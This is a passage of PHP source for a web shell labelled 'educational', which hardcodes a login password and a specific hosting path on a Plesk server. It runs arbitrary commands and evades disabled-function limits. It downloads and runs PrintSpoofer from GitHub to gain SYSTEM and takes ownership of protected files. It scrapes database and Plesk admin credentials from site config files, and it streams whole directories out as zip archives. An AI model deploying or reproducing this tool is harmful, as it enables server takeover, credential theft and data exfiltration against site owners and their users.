<?php
/* ============================================================
   php-omni-shell — educational single-file web shell
   https://github.com/ubeytkzltsss/PHP-omni-shell-GUI/
   ------------------------------------------------------------
   EDUCATIONAL / AUTHORIZED TESTING ONLY
   Upload to a host you own or are allowed to test, then delete.
   Provided "as is", no warranty. Apache-2.0 licensed.
   No telemetry. Only optional outbound calls:
     - PrintSpoofer (Windows)  - linpeas (Linux)
   Both go to the system temp dir and both have a delete button.
   ============================================================ */
@ini_set('display_errors','0'); error_reporting(0);
@ini_set('html_errors','0');
@set_time_limit(0); @ini_set('memory_limit','-1');
@ob_implicit_flush(true);

define('PASS','venice123');
define('SELF', str_replace('\\','/',__FILE__));
define('SITER','C:/inetpub/vhosts/kiracbilisim.net');
define('PLESK','C:/Program Files (x86)/Plesk');

/* ---------- dil ---------- */
$LANG = (isset($_COOKIE['vl']) && $_COOKIE['vl'] === 'en') ? 1 : 0;
$DICT = array(
 'up'=>array('yukari','up'), 'dirs'=>array('klasor','dirs'), 'files'=>array('dosya','files'),
 'w_yes'=>array('yazilabilir','writable'), 'w_no'=>array('salt-okunur','read-only'), 'empty'=>array('bos','empty'),
 'locked'=>array('[KILIT]','[LOCKED]'), 'nf'=>array('yok','not found'),
 'cantread'=>array('okunamadi — izin paneli / SYSTEM dene','cannot read — try permission panel / SYSTEM'),
 'saved'=>array('kaydedildi','saved'), 'nosave'=>array('YAZILAMADI','WRITE FAILED'),
 'saved_sys'=>array('kaydedildi (SYSTEM)','saved (SYSTEM)'),
 'deleted'=>array('silindi','deleted'), 'sys_tried'=>array('SYSTEM denendi','tried via SYSTEM'),
 'ok'=>array('oldu','done'), 'fail'=>array('olmadi','failed'), 'copied'=>array('kopyalandi','copied'),
 'moved'=>array('tasinidi','moved'), 'created'=>array('olusturuldu','created'),
 'uploaded'=>array('yuklendi','uploaded'), 'results'=>array('sonuc','results'),
 'nocmd'=>array('komut bos','empty command'), 'noout'=>array('cikti yok','no output'),
 'installed'=>array('kuruldu','installed'), 'willdel'=>array('silinecek','will be deleted'),
 'no_ps'=>array('PrintSpoofer yok','PrintSpoofer not installed'),
 'no_dump'=>array('mysqldump veya kimlik yok','no mysqldump or credentials'),
 'no_mysql'=>array('mysql yok','no mysql client'), 'no_cred'=>array('calisan kimlik yok','no working credentials'),
 'badlogin'=>array('Hatali sifre','Wrong password'), 'login'=>array('gir','enter'),
 'no_path'=>array('yol yok','path missing'), 'nonwin'=>array('sadece windows','windows only'),
 'db_working'=>array('CALISAN','WORKING'), 'db_hunt'=>array('kimlik avi','credential hunt'),
 'db_test'=>array('test','test'), 'db_list'=>array('veritabanlari','databases'),
 'db_data'=>array('Data klasoru','Data folder'), 'token'=>array('token','token'),
 'ident'=>array('kimlik','identity'), 'admin_mem'=>array('admin uyeligi','admin membership'),
 'msi'=>array('her zaman yuksek (MSI)','always elevated (MSI)'),
 'wr_dirs'=>array('yazilabilir kritik dizinler','writable critical dirs'),
 'unq'=>array('tirnaklanmamis servis yollari','unquoted service paths'),
 'stored'=>array('kayitli kimlikler','stored credentials'), 'tasks_sys'=>array('gorevler (SYSTEM)','tasks (SYSTEM)'),
 'verdict'=>array('VERDICT','VERDICT'), 'no_exec'=>array('exec yok','no exec'),
 'popen_no'=>array('popen yok','no popen'), 'readfail'=>array('okunamadi','read failed'),
);

function t($k){ global $DICT,$LANG; return isset($DICT[$k]) ? $DICT[$k][$LANG] : $k; }

$DIS = array_filter(array_map('trim', explode(',', strtolower((string)@ini_get('disable_functions')))));
function fnok($f){ global $DIS; return function_exists($f) && !in_array(strtolower($f),$DIS); }
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function q($s){ return '"'.str_replace('"','',$s).'"'; }
function fs($n){ $n=(int)$n; if($n>=1073741824) return round($n/1073741824,2).'G'; if($n>=1048576) return round($n/1048576,1).'M'; if($n>=1024) return round($n/1024,1).'K'; return $n.'B'; }

/* ---------- komut ---------- */
function run($cmd,$shell='cmd'){
    if(strtoupper(substr(PHP_OS,0,3))==='WIN'){ $cmd = ($shell==='ps' ? 'powershell -NoProfile -ExecutionPolicy Bypass -Command ' : 'cmd.exe /c ').$cmd; }
    elseif($shell==='ps'){ $cmd='powershell -NoProfile -Command '.$cmd; }
    $cmd .= ' 2>&1';
    if(fnok('system')){ @ob_start(); @system($cmd); return (string)@ob_get_clean(); }
    if(fnok('shell_exec')) return (string)@shell_exec($cmd);
    if(fnok('exec')){ $l=array(); @exec($cmd,$l); return implode("\n",$l); }
    if(fnok('passthru')){ @ob_start(); @passthru($cmd); return (string)@ob_get_clean(); }
    if(fnok('popen')){ $o=''; $hd=@popen($cmd,'r'); if($hd){ while(!@feof($hd)) $o.=@fread($hd,8192); @pclose($hd);} return $o; }
    if(fnok('proc_open')){ $o=''; $ds=array(1=>array('pipe','w'),2=>array('pipe','w')); $hd=@proc_open($cmd,$ds,$pp);
        if(is_resource($hd)){ $o=@stream_get_contents($pp[1]).@stream_get_contents($pp[2]); foreach($pp as $x) @fclose($x); @proc_close($hd);} return $o; }
    return '[!] '.t('no_exec').']';
}
function stream_cmd($cmd){
    $hd=@popen($cmd,'r'); if(!$hd){ echo "-- ".t('popen_no')." --\n"; return false; }
    while(!@feof($hd)){ echo @fread($hd,65536); @flush(); } @pclose($hd); return true;
}
function win(){ return strtoupper(substr(PHP_OS,0,3))==='WIN'; }

/* ---------- yükseltme ---------- */
function sys_exe(){ $p=@sys_get_temp_dir().'/vz_ps64.exe'; return (@is_file($p)&&@filesize($p)>40000)?$p:''; }
function sys_install(){
    $p=@sys_get_temp_dir().'/vz_ps64.exe';
    $u='https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe';
    $d=false;
    if(fnok('curl_init')){ $c=@curl_init($u); @curl_setopt_array($c,array(CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_TIMEOUT=>90)); $d=@curl_exec($c); @curl_close($c); }
    if(($d===false||strlen($d)<40000)&&fnok('file_get_contents')) $d=@file_get_contents($u);
    if($d!==false&&strlen($d)>40000){ @file_put_contents($p,$d); return @is_file($p)?'':'yazilamadi'; }
    run('powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing -Uri '.$u.' -OutFile '.$p.'"');
    return @is_file($p)?'':'indirilemedi';
}
function sysrun($cmd){
    $e=sys_exe(); if($e==='') return '[!] '.t('no_ps').']';
    $b=@sys_get_temp_dir().'/vz_'.substr(md5(uniqid('',true)),0,8).'.bat';
    @file_put_contents($b,"@echo off\r\n".$cmd."\r\n");
    $r=run('"'.$e.'" -c "cmd.exe /c '.$b.'"');
    @unlink($b); return $r;
}
function sysread($f){
    $e=sys_exe(); if($e==='') return false;
    $o=@sys_get_temp_dir().'/vz_'.substr(md5(uniqid('',true)),0,8).'.b64';
    sysrun('powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes(\''.$f.'\'))" > "'.$o.'"');
    $b=@file_get_contents($o); @unlink($o);
    if($b===false||trim($b)==='') return false;
    return @base64_decode(preg_replace('/\s+/','',$b),true);
}
function curuser(){ static $u=null; if($u!==null) return $u; $u=trim((string)run('whoami')); $u=trim(strtok($u,"\r\n")); return $u; }

/* ---------- okuma / listeleme ---------- */
function grab($f){
    $c=@file_get_contents($f); if($c!==false) return $c;
    if(!fnok('popen') && !fnok('shell_exec') && !fnok('system') && !fnok('exec')) return false;
    $c=run('type '.q($f)); if($c!=='' && stripos($c,'cannot find')===false) return $c;
    $c=run('powershell -NoProfile -Command "Get-Content -Raw -LiteralPath \''.$f.'\'"'); if($c!=='') return $c;
    return sysread($f);
}
function lsraw($d){
    $o=array();
    if(fnok('opendir')){ $hd=@opendir($d); if($hd){ while(($e=@readdir($hd))!==false){ if($e!=='.'&&$e!=='..') $o[]=$e; } @closedir($hd); return $o; } }
    if(fnok('scandir')){ $s=@scandir($d); if(is_array($s)) return array_values(array_diff($s,array('.','..'))); }
    foreach(preg_split('/\r?\n/',(string)run('dir /a /b '.q($d))) as $l){ $l=trim($l); if($l!==''&&$l!=='.'&&$l!=='..') $o[]=$l; }
    return $o;
}

/* ---------- zip akışı ---------- */
function dosdt($ts){ $d=@getdate($ts); $y=$d['year']-1980; if($y<0)$y=0; return array((($y<<9)|($d['mon']<<5)|$d['mday']),(($d['hours']<<11)|($d['minutes']<<5)|($d['seconds']>>1))); }
function zstream($root){
    $root=rtrim(str_replace('\\','/',$root),'/');
    $files=array(); $dirs=array(); $st=array($root);
    while($st){ $d=array_pop($st); $hd=@opendir($d);
        if(!$hd){ $dirs[]=$d; continue; }
        $n=0;
        while(($e=@readdir($hd))!==false){ if($e==='.'||$e==='..') continue; $f=$d.'/'.$e; if($f===SELF) continue; $n++;
            if(@is_dir($f)) $st[]=$f; else $files[]=$f; }
        @closedir($hd); if($n===0) $dirs[]=$d;
    }
    while(ob_get_level()) @ob_end_clean();
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="'.basename($root).'.zip"');
    header('X-Accel-Buffering: no'); header('Cache-Control: no-store');
    $CD=''; $OFF=0; $pref=strlen($root)+1; $defl=function_exists('deflate_init');
    $emit=function($nm,$full,$isD) use (&$CD,&$OFF,$defl){
        $mt=$isD?time():(int)@filemtime($full); if(!$mt)$mt=time();
        list($dt,$tm)=dosdt($mt); $m=($isD||!$defl)?0:8; $s0=$OFF;
        echo "PK\x03\x04".pack('v',20).pack('v',0x0008).pack('v',$m).pack('v',$tm).pack('v',$dt)
           .pack('V',0).pack('V',0).pack('V',0).pack('v',strlen($nm)).pack('v',0).$nm;
        $crc=0;$cs=0;$us=0;
        if($isD){ echo "PK\x07\x08".pack('V',0).pack('V',0).pack('V',0); $OFF+=strlen($nm)+46; }
        else { $hh=hash_init('crc32b'); $cx=($m===8)?deflate_init(ZLIB_ENCODING_RAW,array('level'=>6)):null;
            $fp=@fopen($full,'rb');
            if($fp){ while(!@feof($fp)){ $b=@fread($fp,262144); if($b===false||$b==='') break; $us+=strlen($b); hash_update($hh,$b);
                $o=$cx?deflate_add($cx,$b,ZLIB_NO_FLUSH):$b; if($o!==''){ echo $o; $cs+=strlen($o);} } @fclose($fp); }
            if($cx){ $o=deflate_add($cx,'',ZLIB_FINISH); echo $o; $cs+=strlen($o); }
            $crc=hexdec(hash_final($hh));
            echo "PK\x07\x08".pack('V',$crc).pack('V',$cs).pack('V',$us); $OFF+=strlen($nm)+30+$cs+16;
        }
        $CD.="PK\x01\x02".pack('v',20).pack('v',20).pack('v',0x0008).pack('v',$m).pack('v',$tm).pack('v',$dt)
            .pack('V',$crc).pack('V',$cs).pack('V',$us).pack('v',strlen($nm)).pack('v',0).pack('v',0)
            .pack('v',0).pack('v',0).pack('V',0).pack('V',$s0).$nm;
        @flush();
    };
    foreach($dirs as $d){ $r=substr($d,$pref); if($r!==''&&$r!==false) $emit($r.'/',$d,true); }
    foreach($files as $f) $emit(substr($f,$pref),$f,false);
    echo $CD;
    echo "PK\x05\x06".pack('v',0).pack('v',0).pack('v',count($dirs)+count($files)).pack('v',count($dirs)+count($files))
       .pack('V',strlen($CD)).pack('V',$OFF).pack('v',0);
}

/* ---------- parametre ---------- */
$P=array();
$rd = isset($_POST['d'])?$_POST['d']:(isset($_GET['d'])?$_GET['d']:'');
if($rd!==''){ $j=base64_decode($rd,true); if($j!==false){ $t=json_decode($j,true); if(is_array($t)) $P=$t; } }
foreach($_POST as $k=>$v){ if(!isset($P[$k])) $P[$k]=$v; }
foreach($_GET as $k=>$v){ if(!isset($P[$k])) $P[$k]=$v; }
function p($k,$d=''){ global $P; return (isset($P[$k])&&$P[$k]!=='')?$P[$k]:$d; }

/* ---------- oturum ---------- */
$HASH=md5('om9'.PASS);
$ok=(isset($_COOKIE['vo'])&&$_COOKIE['vo']===$HASH)||(isset($_GET['k'])&&$_GET['k']===PASS);
if(isset($_POST['pw'])){ if($_POST['pw']===PASS){ @setcookie('vo',$HASH,time()+2592000,'/'); $ok=true; } else $err=1; }
if(isset($_GET['out'])){ @setcookie('vo','',time()-3600,'/'); header('Location: ?'); exit; }
if(isset($_GET['l'])){ @setcookie('vl', $_GET['l']==='en'?'en':'tr', time()+2592000, '/'); $LANG = $_GET['l']==='en'?1:0; }
$SAFE=isset($_COOKIE['vsf'])&&$_COOKIE['vsf']==='1';

/* ---------- ham uçlar (auth sonrası) ---------- */
$A=p('a','ls');
$path=str_replace('\\','/',(string)p('p',@getcwd()));
if($path==='') $path='/';
$rp=@realpath($path); if($rp!==false) $path=str_replace('\\','/',$rp);
if($path!=='/'&&substr($path,-1)!=='/') $path.='/';

if($ok){
    if(isset($_GET['dl'])){
        $f=base64_decode(strtr($_GET['dl'],'-_','+/'));
        if(!@is_file($f)){ header('HTTP/1.1 404'); exit('404'); }
        while(ob_get_level()) @ob_end_clean();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.(int)@filesize($f));
        $fp=@fopen($f,'rb'); if($fp){ while(!@feof($fp)){ echo @fread($fp,65536); @flush(); } @fclose($fp); } exit;
    }
    if(isset($_GET['raw'])){
        $f=base64_decode(strtr($_GET['raw'],'-_','+/'));
        if(!@is_file($f)){ header('HTTP/1.1 404'); exit('404'); }
        $c=grab($f); if($c===false) exit('okunamadi');
        while(ob_get_level()) @ob_end_clean();
        $e=strtolower(@pathinfo($f,PATHINFO_EXTENSION));
        $m=array('png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','webp'=>'image/webp','svg'=>'image/svg+xml','pdf'=>'application/pdf','txt'=>'text/plain; charset=utf-8','ico'=>'image/x-icon');
        header('Content-Type: '.(isset($m[$e])?$m[$e]:'application/octet-stream'));
        header('Content-Length: '.strlen($c)); echo $c; exit;
    }
    if(isset($_GET['zd'])){ zstream(base64_decode(strtr($_GET['zd'],'-_','+/'))); exit; }
}

/* ---------- login ---------- */
if(!$ok){
?><!DOCTYPE html><html lang="<?php echo $LANG?'en':'tr'; ?>"><head><meta charset="utf-8"><title>omni</title>
<style>body{background:#080a0e;color:#c9d1d9;font:14px monospace;display:flex;height:100vh;align-items:center;justify-content:center;margin:0}
form{background:#12161d;padding:26px;border:1px solid #2a313b;border-radius:9px}input{padding:9px;background:#080a0e;border:1px solid #2a313b;color:#c9d1d9;border-radius:4px}
button{padding:9px 14px;background:#1f6feb;border:0;color:#fff;border-radius:4px;cursor:pointer;margin-left:5px}
.e{color:#f85149;font-size:12px;margin-top:6px}
.lg{position:fixed;top:12px;right:12px;font-size:12px}.lg a{color:#58a6ff;cursor:pointer;text-decoration:none;padding:0 4px}</style></head><body>
<div class="lg"><a onclick="location='?l=tr'">TR</a>|<a onclick="location='?l=en'">EN</a></div>
<form method="post"><b>venice omni</b><br><br><input type="password" name="pw" autofocus><button><?php echo t('login'); ?></button>
<?php if(!empty($err)) echo '<div class="e">'.t('badlogin').'</div>'; ?></form></body></html>
<?php exit; }

/* ---------- open_basedir genişletme ---------- */
$OB=@ini_get('open_basedir');
if($OB){ @ini_set('open_basedir', $OB.';C:/;'.dirname($path).';'.SITER); }

$WRITE=array('save','del','ren','copy','move','mk','mkfile','up','touch');

/* ================= AKSİYONLAR ================= */
if(isset($_POST['d'])||$A!=='ls'){
 if($SAFE && in_array($A,$WRITE)){ echo t('locked'); exit; }

 switch($A){

/* ---------------- DOSYALAR ---------------- */
case 'ls': {
    $it=lsraw($path); $dirs=array(); $files=array();
    foreach($it as $e){ $f=$path.$e; if(@is_dir($f)) $dirs[]=$e; else $files[]=$e; }
    natcasesort($dirs); natcasesort($files); $dirs=array_values($dirs); $files=array_values($files);
    $isRoot=($path==='/'||preg_match('#^[A-Za-z]:/$#',$path));
    $par=$isRoot?$path:str_replace('\\','/',dirname($path)).'/';
    $c='<div class="crumb"><a class="up" onclick="go(\''.h($par).'\')">&uarr; '.t('up').'</a>';
    $ps=explode('/',trim($path,'/'));
    if(preg_match('#^[A-Za-z]:#',$path)){ $d0=array_shift($ps); $c.='<a onclick="go(\''.h($d0).'/\')">'.h($d0).'</a>'; $acc=$d0; }
    else { $c.='<a onclick="go(\'/\')">/</a>'; $acc=''; }
    foreach($ps as $x){ if($x==='') continue; $acc.='/'.$x; $c.='<span class="sep">/</span><a onclick="go(\''.h($acc).'/\')">'.h($x).'</a>'; }
    $c.='</div>';
    $w=@is_writable($path)?'<span class="ok">'.t('w_yes').'</span>':'<span class="no">'.t('w_no').'</span>';
    $r='';
    if(!$isRoot) $r.='<tr><td class="ic">&#8617;</td><td class="nm"><a onclick="go(\''.h($par).'\')">..</a></td><td></td><td></td><td></td><td></td></tr>';
    foreach($dirs as $e){ $f=$path.$e;
        $r.='<tr><td class="ic">&#128193;</td><td class="nm"><a onclick="go(\''.h($f).'/\')">'.h($e).'</a></td><td class="sz">DIR</td><td class="pm">'.h(@substr(sprintf('%o',@fileperms($f)),-4)).'</td><td class="dt">'.@date('Y-m-d H:i',(int)@filemtime($f)).'</td><td class="ac"><a class="b" onclick="perm(\''.h($f).'\')">'.t('perm').'</a><a class="b" onclick="ren(\''.h($f).'\')">'.t('ren').'</a><a class="b d" onclick="del(\''.h($f).'\')">'.t('del').'</a></td></tr>'; }
    foreach($files as $e){ $f=$path.$e;
        $r.='<tr><td class="ic">&#128196;</td><td class="nm"><a onclick="dl(\''.h($f).'\')">'.h($e).'</a></td><td class="sz">'.fs(@filesize($f)).'</td><td class="pm">'.h(@substr(sprintf('%o',@fileperms($f)),-4)).'</td><td class="dt">'.@date('Y-m-d H:i',(int)@filemtime($f)).'</td><td class="ac"><a class="b" onclick="view(\''.h($f).'\')">'.t('view').'</a><a class="b" onclick="dl(\''.h($f).'\')">'.t('dl').'</a><a class="b" onclick="perm(\''.h($f).'\')">'.t('perm').'</a><a class="b" onclick="ren(\''.h($f).'\')">'.t('ren').'</a><a class="b" onclick="cp(\''.h($f).'\')">'.t('cp').'</a><a class="b d" onclick="del(\''.h($f).'\')">'.t('del').'</a></td></tr>'; }
    if($r==='') $r='<tr><td colspan="6" class="empty">'.t('empty').'</td></tr>';
    echo '<input type="hidden" id="cur" value="'.h($path).'">'.$c;
    echo '<div class="meta">'.h($path).' &middot; '.$w.' &middot; '.count($dirs).' '.t('dirs').' / '.count($files).' '.t('files').'</div><table>'.$r.'</table>';
    exit;
}
case 'read': {
    $f=p('f'); if(!@is_file($f)){ echo t('nf'); exit; }
    $c=grab($f); if($c===false){ echo t('cantread'); exit; }
    $e=strtolower(@pathinfo($f,PATHINFO_EXTENSION));
    $img=in_array($e,array('png','jpg','jpeg','gif','webp','bmp','svg','ico'));
    echo '<input type="hidden" id="cur" value="'.h(dirname($f)).'/">';
    echo '<div class="crumb"><a onclick="go(\''.h(str_replace('\\','/',dirname($f))).'/\')">&uarr; '.t('back').'</a><b>'.h(basename($f)).'</b> <a onclick="dl(\''.h($f).'\')">'.t('dl').'</a> <a onclick="raw(\''.h($f).'\')">'.t('raw').'</a> <a onclick="perm(\''.h($f).'\')">'.t('perm').'</a></div>';
    echo '<div class="meta">'.fs(strlen($c)).' &middot; <a class="b" onclick="save(\''.h($f).'\')">'.t('save').'</a> <a class="b" onclick="hsh(\''.h($f).'\')">'.t('hash').'</a> <a class="b" onclick="hx(\''.h($f).'\')">'.t('hex').'</a></div>';
    if($img) echo '<div style="margin-bottom:8px"><img src="'.h(basename(__FILE__)).'?raw='.urlencode(base64_encode($f)).'" style="max-width:100%;max-height:46vh"></div>';
    echo '<textarea id="ed" spellcheck="false">'.h($c).'</textarea>'; exit;
}
case 'save': {
    $f=p('f'); $c=(string)p('c');
    if(@file_put_contents($f,$c)===false){ sysrun('cmd /c echo. > '.q($f)); $n=@file_put_contents($f,$c); echo $n===false?t('nosave'):t('saved_sys'); }
    else echo t('saved'); exit;
}
case 'del': {
    $f=p('f'); $ok2=@is_dir($f)?@rmdir($f):@unlink($f);
    if(!$ok2) sysrun('cmd /c '.(@is_dir($f)?'rmdir /s /q ':'').q($f));
    echo $ok2?t('deleted'):t('sys_tried'); exit;
}
case 'ren': { $f=p('f'); $n=p('n'); $d=rtrim(str_replace('\\','/',dirname($f)),'/').'/'.$n; echo @rename($f,$d)?t('ok'):t('fail'); exit; }
case 'copy': { $f=p('f'); $n=p('n'); $d=rtrim(str_replace('\\','/',dirname($f)),'/').'/'.$n; echo @copy($f,$d)?t('copied'):t('fail'); exit; }
case 'move': { $f=p('f'); $t=p('t'); echo @rename($f,$t)?t('moved'):t('fail'); exit; }
case 'touch': { $f=p('f'); echo @touch($f)?'ok':t('fail'); exit; }
case 'mk': { $n=p('n'); $t2=rtrim($path,'/').'/'.$n; $o=@mkdir($t2); if(!$o) sysrun('cmd /c mkdir '.q($t2)); echo $o?t('created'):t('sys_tried'); exit; }
case 'mkfile': { $n=p('n'); $t2=rtrim($path,'/').'/'.$n; echo @file_put_contents($t2,'')!==false?t('created'):t('fail'); exit; }
case 'up': {
    $n=0; $fl=isset($_FILES['file'])?$_FILES['file']:null;
    if($fl){ $nm=(array)$fl['name']; $tm=(array)$fl['tmp_name'];
        foreach($nm as $i=>$x){ $d=rtrim($path,'/').'/'.basename($x);
            if(@move_uploaded_file($tm[$i],$d)||@copy($tm[$i],$d)) $n++;
            else { sysrun('cmd /c copy /y '.q($tm[$i]).' '.q($d)); if(@is_file($d)) $n++; } } }
    echo $n.' '.t('uploaded'); exit;
}
case 'find': {
    $qq=p('q'); if($qq===''){ echo t('empty'); exit; }
    $res=array(); $st=array(rtrim($path,'/'));
    while($st && count($res)<400){ $d=array_pop($st); $hd=@opendir($d); if(!$hd) continue;
        while(($e=@readdir($hd))!==false){ if($e==='.'||$e==='..') continue; $f=$d.'/'.$e;
            if(stripos($e,$qq)!==false) $res[]=$f; if(@is_dir($f)) $st[]=$f; } @closedir($hd); }
    if(!$res){ echo t('nf'); exit; }
    echo '<div class="meta">'.count($res).' '.t('results').'</div><table>';
    foreach($res as $r){ $d2=@is_dir($r); echo '<tr><td class="ic">'.($d2?'&#128193;':'&#128196;').'</td><td class="nm"><a onclick="'.($d2?'go(\''.h($r).'/\')':'view(\''.h($r).'\')').'">'.h($r).'</a></td></tr>'; }
    echo '</table>'; exit;
}
case 'hash': { $f=p('f'); $c=grab($f); if($c===false){ echo t('readfail'); exit; } echo "md5: ".md5($c)."\nsha1: ".sha1($c)."\nsha256: ".hash('sha256',$c)."\nsize: ".strlen($c); exit; }
case 'hex': {
    $f=p('f'); $c=grab($f); if($c===false){ echo t('readfail'); exit; }
    $o=''; $len=min(strlen($c),8192);
    for($i=0;$i<$len;$i+=16){ $ch=substr($c,$i,16); $o.=sprintf('%08X  ', $i);
        for($j=0;$j<16;$j++) $o.= $j<strlen($ch) ? sprintf('%02X ',$ch[$j]) : '   ';
        $o.= ' '.preg_replace('/[^\x20-\x7e]/','.',$ch)."\n"; }
    echo '<div class="crumb"><a onclick="view(\''.h($f).'\')">&uarr; '.t('back').'</a>hex</div><div class="wrap">'.h($o).'</div>'; exit;
}
case 'perm': {
    $f=p('f'); $m=p('m','show'); $u=curuser(); $qq=q($f); $o='';
    if($m==='show') $o=run('icacls '.$qq)."\n--- attrib ---\n".run('attrib '.$qq);
    elseif($m==='grant') $o=sysrun('takeown /f '.$qq.' /a'."\r\n".'icacls '.$qq.' /grant "'.$u.'":F');
    elseif($m==='grantr') $o=sysrun('takeown /f '.$qq.' /r /d Y'."\r\n".'icacls '.$qq.' /grant "'.$u.'":(OI)(CI)F /t');
    elseif($m==='attr-') $o=run('attrib -R '.$qq);
    elseif($m==='attr+') $o=run('attrib +R '.$qq);
    elseif($m==='unix') $o=@chmod($f,octdec(p('o','0755')))?'ok':t('fail');
    echo h(trim($o))===''?t('noout'):h($o); exit;
}
case 'tree': {
    $o=''; $st=array(array(rtrim($path,'/'),0));
    while($st){ list($d,$lv)=array_pop($st); if($lv>4) continue;
        foreach(lsraw($d) as $e){ $f=$d.'/'.$e; $o.=str_repeat('&nbsp;',$lv*3).($e)."<br>";
            if(@is_dir($f)) $st[]=array($f,$lv+1); } }
    echo '<div class="wrap">'.($o?:t('empty')).'</div>'; exit;
}

/* ---------------- TERMİNAL ---------------- */
case 'exec': {
    $c=p('c'); $sh=p('sh','cmd'); $as=p('as','user');
    if($c===''){ echo t('nocmd'); exit; }
    $old=@getcwd(); @chdir(rtrim($path,'/'));
    echo h($as==='sys'?sysrun($c):run($c,$sh));
    @chdir($old); exit;
}

/* ---------------- SYSTEM ---------------- */
case 'sys': {
    $m=p('m','check');
    if($m==='install'){ echo sys_install()?:t('installed').': '.sys_exe(); exit; }
    if($m==='test'){ echo sysrun('whoami'); exit; }
    if($m==='kill'){ @unlink(sys_exe()); echo t('deleted'); exit; }
    $o='';
    $priv=run('whoami /priv'); $grp=run('whoami /groups');
    $o.="### ".t('token')."\n".$priv."\n";
    $imp = (stripos($priv,'SeImpersonatePrivilege')!==false);
    $o.="\n### ".t('ident')."\n".curuser()."\n";
    $o.="\n### ".t('admin_mem')."\n".run('net localgroup administrators')."\n";
    $o.="\n### ".t('msi')."\n".run('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated').run('reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated')."\n";
    $o.="\n### ".t('wr_dirs')."\n";
    foreach(array('C:/Windows/Temp','C:/ProgramData','C:/Program Files (x86)/Plesk','C:/inetpub/temp') as $d)
        $o.='  '.$d.' => '.(@is_writable($d)?'YES':'no')."\n";
    $o.="\n### ".t('unq')."\n".run('wmic service get name,pathname | findstr /i /v "C:\\Windows\\"')."\n";
    $o.="\n### ".t('stored')."\n".run('cmdkey /list')."\n";
    $o.="\n### ".t('tasks_sys')."\n".run('schtasks /query /fo table /nh | findstr /i system')."\n";
    $o.="\n### ".t('verdict')."\n";
    if($imp) $o.=($LANG?'SeImpersonate PRESENT -> PrintSpoofer can give SYSTEM. [install] then [test].':"SeImpersonate VAR -> PrintSpoofer ile SYSTEM alinabilir. [exe indir] sonra [test].")."\n";
    else $o.=($LANG?'SeImpersonate ABSENT -> potatoes fail. Try AlwaysInstallElevated, writable service path, stored creds.':"SeImpersonate YOK -> potato calismaz. Alternatifler: AlwaysInstallElevated, yazilabilir servis yolu, kayitli kimlik.")."\n";
    echo h($o); exit;
}

/* ---------------- VERİTABANI ---------------- */
case 'db': {
    $m=p('m','diag');
    $MD=array('C:/Program Files (x86)/Plesk/MySQL/bin/mysqldump.exe','C:/Program Files (x86)/Plesk/Databases/MySQL/bin/mysqldump.exe','C:/Program Files/MySQL/MySQL Server 8.0/bin/mysqldump.exe','C:/xampp/mysql/bin/mysqldump.exe');
    $MB=array('C:/Program Files (x86)/Plesk/MySQL/bin/mysql.exe','C:/Program Files (x86)/Plesk/Databases/MySQL/bin/mysql.exe','C:/Program Files/MySQL/MySQL Server 8.0/bin/mysql.exe');
    $DD=array('C:/Program Files (x86)/Plesk/Databases/MySQL/Data','C:/Program Files (x86)/Plesk/MySQL/Data','C:/ProgramData/MySQL/MySQL Server 8.0/Data');
    $dump=''; foreach($MD as $x) if(@is_file($x)){ $dump=$x; break; }
    $my=''; foreach($MB as $x) if(@is_file($x)){ $my=$x; break; }
    $dd=''; foreach($DD as $x) if(@is_dir($x)){ $dd=$x; break; }

    if($m==='diag'){
        $o="mysqldump : ".($dump?:'no')."\nmysql     : ".($my?:'no')."\nData      : ".($dd?:'no')."\n";
        $o.="\n--- ".t('db_hunt')." ---\n";
        $cr=array();
        $names=array('wp-config.php','configuration.php','.env','.env.local','config/database.php','includes/configure.php','app/etc/env.php','settings.php','database.php','db.php','config.php');
        $st=array(array(SITER,0));
        while($st){ list($d,$lv)=array_pop($st); if($lv>3) continue;
            foreach($names as $n){ $f=rtrim($d,'/').'/'.$n; if(!@is_file($f)) continue;
                $c=@file_get_contents($f); if($c===false) continue;
                $u=''; $pw='';
                if(preg_match("/DB_USER'?\"?\s*,\s*'([^']*)'/i",$c,$mm)) $u=$mm[1];
                if(preg_match("/DB_PASSWORD'?\"?\s*,\s*'([^']*)'/i",$c,$mm)) $pw=$mm[1];
                if(preg_match('/^DB_USER(NAME)?\s*=\s*(.+)$/mi',$c,$mm)) $u=trim($mm[2]," \r\n\"'");
                if(preg_match('/^DB_PASSWORD\s*=\s*(.+)$/mi',$c,$mm)) $pw=trim($mm[2]," \r\n\"'");
                if(preg_match("/'username'\s*=>\s*'([^']*)'/",$c,$mm)) $u=$mm[1];
                if(preg_match("/'password'\s*=>\s*'([^']*)'/",$c,$mm)) $pw=$mm[1];
                if($u!==''){ $cr[]=array($u,$pw,$f); $o.="  $u / $pw  <- $f\n"; } }
            $hd=@opendir($d); if($hd){ while(($e=@readdir($hd))!==false){ if($e==='.'||$e==='..') continue; $f=$d.'/'.$e;
                if(@is_dir($f)&&!in_array($e,array('bin','logs','error_docs','statistics','tmp','private'))) $st[]=array($f,$lv+1); } @closedir($hd); } }
        foreach(array('C:/Program Files (x86)/Plesk/sbin/psadb.exe','C:/Program Files (x86)/Plesk/bin/psadb.exe') as $x){
            if(!@is_file($x)) continue;
            $r=trim((string)run(q($x).' -g'));
            if($r!==''&&stripos($r,'usage')===false&&strlen($r)<200){ $r=trim(strtok($r,"\r\n")); $cr[]=array('admin',$r,$x); $o.="  admin / $r  <- psadb\n"; } }
        $cr[]=array('admin','','empty');
        $o.="\n--- ".t('db_test')." ---\n"; $good=null; $port='3306';
        if($my!=='') foreach($cr as $c){ foreach(array('3306','8306') as $pt){
            $r=run(q($my).' -h 127.0.0.1 -P '.$pt.' -u '.q($c[0]).' -p'.q($c[1]).' -e "SELECT 1"');
